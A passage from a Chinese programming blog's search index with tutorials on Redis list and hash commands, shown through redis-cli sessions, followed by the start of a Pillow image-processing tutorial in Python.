punctuation">)</span> 2<span class="token comment" spellcheck="true"># 测量长度</span>127.0.0.1:6379<span class="token operator">></span> llen languages<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2<span class="token comment" spellcheck="true"># 按照索引输出</span>127.0.0.1:6379<span class="token operator">></span> lindex languages 0<span class="token string">"python"</span>127.0.0.1:6379<span class="token operator">></span> lindex languages 1<span class="token string">"python"</span><span class="token comment" spellcheck="true"># 按照范围输出</span>127.0.0.1:6379<span class="token operator">></span> lrange languages 0 -11<span class="token punctuation">)</span> <span class="token string">"python"</span>2<span class="token punctuation">)</span> <span class="token string">"python"</span><span class="token comment" spellcheck="true"># 添加多个值</span>127.0.0.1:6379<span class="token operator">></span> lpush mylist a b c<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 3127.0.0.1:6379<span class="token operator">></span> lrange mylist 0 -11<span class="token punctuation">)</span> <span class="token string">"c"</span>2<span class="token punctuation">)</span> <span class="token string">"b"</span>3<span class="token punctuation">)</span> <span class="token string">"a"</span><span class="token comment" spellcheck="true"># 右添加</span>127.0.0.1:6379<span class="token operator">></span> lrange languages 0 -11<span class="token punctuation">)</span> <span class="token string">"python"</span>2<span class="token punctuation">)</span> <span class="token string">"python"</span>127.0.0.1:6379<span class="token operator">></span> rpush languages radis<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 3127.0.0.1:6379<span class="token operator">></span> lrange languages 0 -11<span class="token punctuation">)</span> <span class="token string">"python"</span>2<span class="token punctuation">)</span> <span class="token string">"python"</span>3<span class="token punctuation">)</span> <span class="token string">"radis"</span>127.0.0.1:6379<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-删除"><a href="#2-删除" class="headerlink" title="2.删除"></a>2.删除</h3><blockquote><p>删除列表元素</p><p>左删除</p><ul><li><p><code>lpop</code></p></li><li><p><code>blpop</code></p></li></ul><p>右删除</p><ul><li><p><code>rpop</code></p></li><li><p><code>brpop</code></p></li><li><p><code>rpoplpush</code></p></li><li><p><code>brpoplpush</code></p></li></ul><p>综合</p><ul><li><code>lrem key count value</code> :<ul><li><code>count&gt;0</code>:从头部开始搜索,移除与<code>value</code> 相等的元素,数量为<code>count</code></li><li><code>count&lt;0</code>:从尾部开始搜索,移除与<code>value</code> 相等的元素,数量为<code>count</code> 的绝对值.</li><li><code>count=0</code>:移除表中所有与<code>value</code>相等的元素</li></ul></li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 查看列表所有元素</span>127.0.0.1:6379<span class="token operator">></span> lrange languages 0 -11<span class="token punctuation">)</span> <span class="token string">"python"</span>2<span class="token punctuation">)</span> <span class="token string">"python"</span>3<span class="token punctuation">)</span> <span class="token string">"radis"</span><span class="token comment" spellcheck="true"># 从头部移除第一个元素</span>127.0.0.1:6379<span class="token operator">></span> lpop languages<span class="token string">"python"</span>127.0.0.1:6379<span class="token operator">></span> lrange languages 0 -11<span class="token punctuation">)</span> <span class="token string">"python"</span>2<span class="token punctuation">)</span> <span class="token string">"radis"</span><span class="token comment" spellcheck="true"># 阻塞式移除头部的第一个元素,timeout=3(秒)</span>127.0.0.1:6379<span class="token operator">></span> blpop languages 31<span class="token punctuation">)</span> <span class="token string">"languages"</span>2<span class="token punctuation">)</span> <span class="token string">"python"</span><span class="token comment" spellcheck="true"># 查看最后的元素.</span>127.0.0.1:6379<span class="token operator">></span> llen languages <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> lrange languages 0 -11<span class="token punctuation">)</span> <span class="token string">"radis"</span><span class="token comment" spellcheck="true"># lrem </span><span class="token comment" spellcheck="true"># 新生成一个列表</span>127.0.0.1:6379<span class="token operator">></span> lpush vip <span class="token string">'Jack'</span> <span class="token string">'Bob'</span> <span class="token string">'Parry'</span> <span class="token string">'Jack'</span> <span class="token string">'Bob'</span> <span class="token string">'Hary'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 6127.0.0.1:6379<span class="token operator">></span> llen vip<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 6127.0.0.1:6379<span class="token operator">></span> lrange vip 0 -11<span class="token punctuation">)</span> <span class="token string">"Hary"</span>2<span class="token punctuation">)</span> <span class="token string">"Bob"</span>3<span class="token punctuation">)</span> <span class="token string">"Jack"</span>4<span class="token punctuation">)</span> <span class="token string">"Parry"</span>5<span class="token punctuation">)</span> <span class="token string">"Bob"</span>6<span class="token punctuation">)</span> <span class="token string">"Jack"</span><span class="token comment" spellcheck="true"># 从头部开始移除 1 个 Jack</span>127.0.0.1:6379<span class="token operator">></span> lrem vip 1 Jack<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> lrange vip 0 -11<span class="token punctuation">)</span> <span class="token string">"Hary"</span>2<span class="token punctuation">)</span> <span class="token string">"Bob"</span>3<span class="token punctuation">)</span> <span class="token string">"Parry"</span>4<span class="token punctuation">)</span> <span class="token string">"Bob"</span>5<span class="token punctuation">)</span> <span class="token string">"Jack"</span><span class="token comment" spellcheck="true"># 从尾部开始移除 1 个Jack</span>127.0.0.1:6379<span class="token operator">></span> lrem vip -1 Jack<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> lrange vip 0 -11<span class="token punctuation">)</span> <span class="token string">"Hary"</span>2<span class="token punctuation">)</span> <span class="token string">"Bob"</span>3<span class="token punctuation">)</span> <span class="token string">"Parry"</span>4<span class="token punctuation">)</span> <span class="token string">"Bob"</span><span class="token comment" spellcheck="true"># 移除所有的 Bob</span>127.0.0.1:6379<span class="token operator">></span> lrem vip 0 Bob<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2127.0.0.1:6379<span class="token operator">></span> lrange vip 0 -1 1<span class="token punctuation">)</span> <span class="token string">"Hary"</span>2<span class="token punctuation">)</span> <span class="token string">"Parry"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-插入"><a href="#3-插入" class="headerlink" title="3. 插入"></a>3. 插入</h3><blockquote><p><code>linsert key before/after pivot value</code>:将<code>value</code> 插入到列表<code>key</code> 中,位于值<code>pivot</code> 之前或之后.</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6379<span class="token operator">></span> del mylist<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> rpush mylist <span class="token string">'hello'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> rpush mylist <span class="token string">'world'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2127.0.0.1:6379<span class="token operator">></span> lrange mylist 0 -11<span class="token punctuation">)</span> <span class="token string">"hello"</span>2<span class="token punctuation">)</span> <span class="token string">"world"</span>127.0.0.1:6379<span class="token operator">></span> linsert mylist before <span class="token string">'world'</span> <span class="token string">'there'</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 3127.0.0.1:6379<span class="token operator">></span> lrange mylist 0 -11<span class="token punctuation">)</span> <span class="token string">"hello"</span>2<span class="token punctuation">)</span> <span class="token string">"there"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-索引"><a href="#4-索引" class="headerlink" title="4.索引"></a>4.索引</h3><blockquote><p>长度:<code>llen</code></p><p>索引获取值:<code>lindex</code></p><p>替换索引值:<code>lset key index value</code></p><p>索引获取子值(生成新列表):<code>ltrim</code></p><p>索引获取子值(不改变原列表):<code>lrange</code></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># mylist 列表</span>127.0.0.1:6379<span class="token operator">></span> lrange mylist 0 -11<span class="token punctuation">)</span> <span class="token string">"hello"</span>2<span class="token punctuation">)</span> <span class="token string">"there"</span>3<span class="token punctuation">)</span> <span class="token string">"world"</span><span class="token comment" spellcheck="true"># 通过索引获取值</span>127.0.0.1:6379<span class="token operator">></span> lindex mylist 0<span class="token string">"hello"</span>127.0.0.1:6379<span class="token operator">></span> lindex mylist 1<span class="token string">"there"</span>127.0.0.1:6379<span class="token operator">></span> lindex mylist 2<span class="token string">"world"</span><span class="token comment" spellcheck="true"># 通过索引替换值</span>127.0.0.1:6379<span class="token operator">></span> lset mylist 1 replaceOK127.0.0.1:6379<span class="token operator">></span> lrange mylist 0 -11<span class="token punctuation">)</span> <span class="token string">"hello"</span>2<span class="token punctuation">)</span> <span class="token string">"replace"</span>3<span class="token punctuation">)</span> <span class="token string">"world"</span><span class="token comment" spellcheck="true"># 通过索引生成新的子列表.</span>127.0.0.1:6379<span class="token operator">></span> ltrim mylist 0 1OK127.0.0.1:6379<span class="token operator">></span> lrange mylist 0 -11<span class="token punctuation">)</span> <span class="token string">"hello"</span>2<span class="token punctuation">)</span> <span class="token string">"replace"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis类型Hash</title>
      <link href="/posts/28296.html"/>
      <url>/posts/28296.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="数据类型Hash"><a href="#数据类型Hash" class="headerlink" title="数据类型Hash"></a>数据类型<code>Hash</code></h2><blockquote><p><code>redis hash</code> 是一个<code>string</code> 类型的<code>field</code> 和<code>value</code> 的映射表,<code>hash</code> 特别适合存储对象</p><p>每个<code>hash</code> 对象可以存储$2^{32}-1$ 个键值对.</p></blockquote><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><blockquote><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>hdel key field1 [field2]</code></td><td>删除一个或多个哈希表字段</td></tr><tr><td><code>hexists key field</code></td><td>查看哈希表<code>key</code> 中指定的字段是否存在</td></tr><tr><td><code>hget key field</code></td><td>获取存储在哈希表中指定字段的值</td></tr><tr><td><code>hgetall key field</code></td><td>获取哈希表中指定<code>key</code> 所有字段和值</td></tr><tr><td><code>hincrby key field increment</code></td><td>哈希表中<code>key</code> 指定字段整数增量<code>increment</code></td></tr><tr><td><code>hincrbyfloat key field increment</code></td><td>哈希表中<code>key</code> 指定字段浮点数增量<code>increment</code></td></tr><tr><td><code>hkeys key</code></td><td>获取所有哈希表中的字段</td></tr><tr><td><code>hlen key</code></td><td>获取哈希表中字段的数量</td></tr><tr><td><code>hmget key field1 [field2]</code></td><td>获取所有给定字段的值</td></tr><tr><td><code>hmset key f1 v1 [f2 v2]</code></td><td>同时设置多个键值对到哈希表<code>key</code> 中</td></tr><tr><td><code>hset key field value</code></td><td>将哈希表 key 中的字段 field 的值设为 value</td></tr><tr><td><code>hsetnx key field value</code></td><td>只有在字段 field 不存在时，设置哈希表字段的值</td></tr><tr><td><code>hvals key</code></td><td>获取哈希表中所有值</td></tr><tr><td><code>hscan key cousor</code></td><td>迭代哈希表分钟的键值对</td></tr></tbody></table></blockquote><h3 id="2-基本设置"><a href="#2-基本设置" class="headerlink" title="2.基本设置"></a>2.基本设置</h3><blockquote><ol><li><code>hexists key field</code> :查看哈希表<code>key</code> 中,给定域<code>field</code> 是否存在.</li><li><code>hset key field value</code> :将哈希表 <code>key</code> 中的域 <code>field</code> 的值设为 <code>value</code>,如果<code>key</code> 不存在,一个新的哈希表被创建,如果域<code>field</code> 已经存在,旧值会被覆盖.</li><li><code>hget key field</code> : 返回哈希表<code>key</code> 给定域<code>field</code>的值.</li><li><code>hgetall key</code> :获取哈希表中<code>key</code> 所有的域和值.</li><li><code>hkeys key</code> :获取哈希表中<code>key</code> 的所有域.</li><li><code>hvals key</code> :获取哈希表中<code>key</code> 的所有值.</li><li><code>hlen key</code>:获取哈希表<code>key</code> 中域的数量.</li><li><code>hdel key field1 [field2]</code>:删除哈希表<code>key</code>的一个或多个指定域,不存在的会被忽略</li></ol><p>实例:</p><pre class="line-numbers language-shell"><code class="language-shell">127.0.0.1:6379> HEXISTS google(error) ERR wrong number of arguments for 'hexists' command127.0.0.1:6379> HEXISTS website google(integer) 0127.0.0.1:6379> hset website google 'www.g.cn'(integer) 1127.0.0.1:6379> hset website google 'www.google.com'(integer) 0127.0.0.1:6379> hget website google"www.google.com"127.0.0.1:6379> hgetall website1) "google"2) "www.google.com"127.0.0.1:6379> hkeys website1) "google"127.0.0.1:6379> hvals website1) "www.google.com"127.0.0.1:6379> hlen website(integer) 1127.0.0.1:6379> hdel website (error) ERR wrong number of arguments for 'hdel' command127.0.0.1:6379> hdel website google(integer) 1127.0.0.1:6379> hget website(error) ERR wrong number of arguments for 'hget' command127.0.0.1:6379> hget website google(nil)127.0.0.1:6379> del website(integer) 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-递增"><a href="#3-递增" class="headerlink" title="3.递增"></a>3.递增</h3><blockquote><p>1.<code>hincrby key field increment</code>:为哈希表 <code>key</code> 中的域 <code>field</code> 的值加上增量 <code>increment</code>,增量也可以为负数，相当于对给定域进行减法操作.如果域 <code>field</code> 不存在，那么在执行命令前，域的值被初始化为 <code>0</code>.</p><p>2.<code>HINCRBYFLOAT key field increment</code>:为哈希表 <code>key</code> 中的域 <code>field</code> 加上浮点数增量 <code>increment</code></p><pre class="line-numbers language-shell"><code class="language-shell"># increment 为正数redis> HEXISTS counter page_view    # 对空域进行设置(integer) 0redis> HINCRBY counter page_view 200(integer) 200redis> HGET counter page_view"200"# increment 为负数redis> HGET counter page_view"200"redis> HINCRBY counter page_view -50(integer) 150redis> HGET counter page_view"150"# 尝试对字符串值的域执行HINCRBY命令redis> HSET myhash string hello,world       # 设定一个字符串值(integer) 1redis> HGET myhash string"hello,world"redis> HINCRBY myhash string 1              # 命令执行失败，错误。(error) ERR hash value is not an integerredis> HGET myhash string                   # 原值不变"hello,world"# 值和增量都是普通小数redis> HSET mykey field 10.50(integer) 1redis> HINCRBYFLOAT mykey field 0.1"10.6"# 值和增量都是指数符号redis> HSET mykey field 5.0e3(integer) 0redis> HINCRBYFLOAT mykey field 2.0e2"5200"# 对不存在的键执行 HINCRBYFLOATredis> EXISTS price(integer) 0redis> HINCRBYFLOAT price milk 3.5"3.5"redis> HGETALL price1) "milk"2) "3.5"# 对不存在的域进行 HINCRBYFLOATredis> HGETALL price1) "milk"2) "3.5"redis> HINCRBYFLOAT price coffee 4.5   # 新增 coffee 域"4.5"redis> HGETALL price1) "milk"2) "3.5"3) "coffee"4) "4.5"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pillow作图</title>
      <link href="/posts/43456.html"/>
      <url>/posts/43456.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-30/1601468958824-pillow.png" alt="pillow"></p><h2 id="Pillow"><a href="#Pillow" class="headerlink" title="Pillow"></a><code>Pillow</code></h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><blockquote><p><code>PIL：Python Imaging Library</code>，已经是Python平台事实上的图像处理标准库了。PIL功能非常强大，但API却非常简单易用.</p><p>入口:<code>https://wenyan.online/navigate/</code></p></blockquote><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><blockquote><pre class="line-numbers language-bash">$ pip install pillow</code></pre><p>验证版本</p><pre><code class="python"><code class="language-bash">$ pip install pillow</code></pre><p>验证版本</p><pre><code class="python">>>> import PIL>>> PIL.__version'7.2.0'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-基本操作"><a href="#3-基本操作" class="headerlink" title="3.基本操作"></a>3.基本操作</h3><h4 id="1-使用Image类"><a href="#1-使用Image类" class="headerlink" title="1.使用Image类"></a>1.使用<code>Image</code>类</h4><blockquote><p>PIL最重要的是<code>Image class</code>，可以通过多种方法创建这个类的实例：可以从文件加载图像，或者处理其他图像，或者从<code>sratck</code>创建<br>从文件中加载图像，可以使用<code>open()</code>函数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token comment" spellcheck="true"># 10001.jpg 存在于同目录下</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'10001.jpg'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>加载成功后，将返回一个图像对象，可以通过使用示例属性查看文件内容：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>format<span class="token punctuation">,</span> img<span class="token punctuation">.</span>size<span class="token punctuation">,</span> img<span class="token punctuation">.</span>mode<span class="token punctuation">)</span>JPEG <span class="token punctuation">(</span><span class="token number">1920</span><span class="token punctuation">,</span> <span class="token number">1080</span><span class="token punctuation">)</span> RGB<span class="token comment" spellcheck="true">#format：格式，这个属性标识了图像来源</span><span class="token comment" spellcheck="true">#size：尺寸，如果图像不是从文件读取，他的值没有大小，返回结果是一个二元组(宽度，高度)单位是像素</span><span class="token comment" spellcheck="true">#mode:模式属性定了图像带的数量和名称，以及像素类型和深度。常见的模式有'L'(亮度)表示灰度图像，'RGB'标识真彩色图像，'CMYK'表示出版图像</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显示图像(会调用系统的图片查看器)：</p><pre class="line-numbers language-python">img.show()</code></pre></blockquote><h4 id="2-读写图像"><a href="#2-读写图像" class="headerlink" title="2.读写图像"></a>2.读写图像</h4><blockquote><p>PIL模块支持大量图片格式。使用在图像模块的open()函数从磁盘读取文件。你不需要知道文件格式就绪打开它，这个库能够根据文件内容自动确定文件格式。要保存文件，使用Image类的save()方法。保存文件的时候文件名变得重要了。除非你指定格式，否则这个库将会以文件名的扩展名作为格式保存。<br>加载文件，并转换为png格式</p><p><code>save()</code>的第二个参数可以指定文件格式。</p><pre><code class="python"><code class="language-python">img.show()</code></pre></blockquote><h4 id="2-读写图像"><a href="#2-读写图像" class="headerlink" title="2.读写图像"></a>2.读写图像</h4><blockquote><p>PIL模块支持大量图片格式。使用在图像模块的open()函数从磁盘读取文件。你不需要知道文件格式就绪打开它，这个库能够根据文件内容自动确定文件格式。要保存文件，使用Image类的save()方法。保存文件的时候文件名变得重要了。除非你指定格式，否则这个库将会以文件名的扩展名作为格式保存。<br>加载文件，并转换为png格式</p><p><code>save()</code>的第二个参数可以指定文件格式。</p><pre><code class="python">#!/usr/bin/env python# coding=utf-8from  PIL import Imageimport osimport sysfor infile in sys.argv[1:]: f,e = os.path.splitext(infile) outfile = f + '.png' if infile != outfile:     try:         Image.open(infile).save(outfile)     except IOError:         print('Can not convert', infile)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行:</p><pre class="line-numbers language-bash"><code class="language-bash">❯ <span class="token function">ls</span>10001.jpg  1图片格式转换.py❯ python 1图片格式转换.py 10001.jpg❯ <span class="token function">ls</span>10001.jpg  10001.png  1图片格式转换.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-创建缩略图"><a href="#3-创建缩略图" class="headerlink" title="3.创建缩略图"></a>3.创建缩略图</h4><blockquote><p>缩略图是网络开发或图像软件预览常用的一种基本技术，使用Python的Pillow图像库可以很方便的建立缩略图</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token keyword">import</span> os<span class="token punctuation">,</span> sys<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagesize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token keyword">for</span> infile <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span> outfile <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>splitext<span class="token punctuation">(</span>infile<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">".thumbnail"</span> <span class="token keyword">if</span> infile <span class="token operator">!=</span> outfile<span class="token punctuation">:</span>     <span class="token keyword">try</span><span class="token punctuation">:</span>         im <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>infile<span class="token punctuation">)</span>         im<span class="token punctuation">.</span>thumbnail<span class="token punctuation">(</span>size<span class="token punctuation">)</span>         im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>outfile<span class="token punctuation">,</span> <span class="token string">"JPEG"</span><span class="token punctuation">)</span>     <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"cannot create thumbnail for"</span><span class="token punctuation">,</span> infile<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很重要的一点是这个库不会直接解码或者加载图像栅格数据。当你打开一个文件，只会读取文件头信息用来确定格式，颜色模式，大小等等，文件的剩余部分不会主动处理。这意味着打开一个图像文件的操作十分快速，跟图片大小和压缩方式无关。下面是一个简单的脚本用来快速验证大量图片。</p></blockquote><h4 id="4-验证图像文件"><a href="#4-验证图像文件" class="headerlink" title="4.验证图像文件"></a>4.验证图像文件</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token keyword">import</span> sys<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">for</span> infile <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">try</span><span class="token punctuation">:</span>     <span class="token keyword">with</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>infile<span class="token punctuation">)</span> <span class="token keyword">as</span> im<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>infile<span class="token punctuation">,</span> im<span class="token punctuation">.</span>format<span class="token punctuation">,</span> <span class="token string">"%dx%d"</span> <span class="token operator">%</span> im<span class="token punctuation">.</span>size<span class="token punctuation">,</span> im<span class="token punctuation">.</span>mode<span class="token punctuation">)</span> <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>     <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="5-图像剪切粘贴与合并"><a href="#5-图像剪切粘贴与合并" class="headerlink" title="5.图像剪切粘贴与合并"></a>5.图像剪切粘贴与合并</h4><blockquote><p>Image类包含的方法允许操作图像部分选区，PIL.Image.crop方法获取图像的一个矩形选区</p><p>创建一个矩形选区</p><pre class="line-numbers language-python"><code class="language-python">box <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span>region <span class="token operator">=</span> im<span class="token punctuation">.</span>crop<span class="token punctuation">(</span>box<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>矩形选区有一个4元元组定义，分别表示左、上、右、下的坐标。这个库以左上角为坐标原点，单位是px，所以上诉代码复制了一个 300x300 pixels 的矩形选区。这个选区现在可以被处理并且粘贴到原图。</p><p>处理复制的矩形选区并粘贴到原图</p><pre class="line-numbers language-python"><code class="language-python">region <span class="token operator">=</span> region<span class="token punctuation">.</span>transpose<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>ROTATE_180<span class="token punctuation">)</span>im<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>region<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当你粘贴矩形选区的时候必须保证尺寸一致。此外，矩形选区不能在图像外。然而你不必保证矩形选区和原图的颜色模式一致，因为矩形选区会被自动转换颜色.</p></blockquote><h4 id="6-图像过滤"><a href="#6-图像过滤" class="headerlink" title="6.图像过滤"></a>6.图像过滤</h4><blockquote><p>图像滤镜在 ImageFilter() 模块中，在该模块中，预先定义了很多的增强滤镜，可以通过filter()函数使用，其中包括:</p><ul><li>BLUR—&gt;模糊滤镜</li><li>CONTOUR—&gt;轮廓</li><li>DETAIL—&gt;细节滤镜</li><li>EDGE_ENHANCE —–&gt;边界加强</li><li>EDGE_ENHANCE_MORE—-&gt;边界加强(阈值更大)</li><li>EMBOSS ——–&gt;浮雕滤镜</li><li>FIND_EDGES——-&gt;边界滤镜</li><li>SMOOTH ——–&gt;平滑滤镜</li><li>SMOOTH_MORE——–&gt;平滑滤镜(阈值更大)</li><li>SHARPEN —–锐化滤镜</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#示例</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageFilter  <span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageimgF <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"10001.png"</span><span class="token punctuation">)</span>  outF <span class="token operator">=</span> imgF<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>DETAIL<span class="token punctuation">)</span>  conF <span class="token operator">=</span> imgF<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>CONTOUR<span class="token punctuation">)</span>  edgeF <span class="token operator">=</span> imgF<span class="token punctuation">.</span>filter<span class="token 